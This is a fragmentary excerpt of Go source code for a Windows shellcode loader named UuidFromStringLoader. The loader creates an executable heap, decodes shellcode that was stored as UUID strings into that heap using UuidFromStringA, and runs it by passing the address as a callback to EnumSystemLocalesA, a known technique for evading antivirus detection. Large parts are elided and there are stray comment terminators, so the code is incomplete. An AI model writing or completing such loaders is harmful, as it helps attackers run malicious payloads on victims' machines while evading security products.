...
func UuidFromStringLoader(shellcode []byte) {
	...
	*/
	...
	// Create the heap
	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	heapAddr, _, err := api.HeapCreate().Call(0x00040000, 0, 0)
	if heapAddr == 0 {
	...
	// Allocate the heap
	addr, _, err := api.HeapAlloc().Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
	...
	*/
	...
	for _, uuid := range uuids {
		...
		rpcStatus, _, err := api.UuidFromStringA().Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)
	...
	*/
	...
	// Execute Shellcode
	ret, _, err := api.EnumSystemLocalesA().Call(addr, 0)
	if ret == 0 {
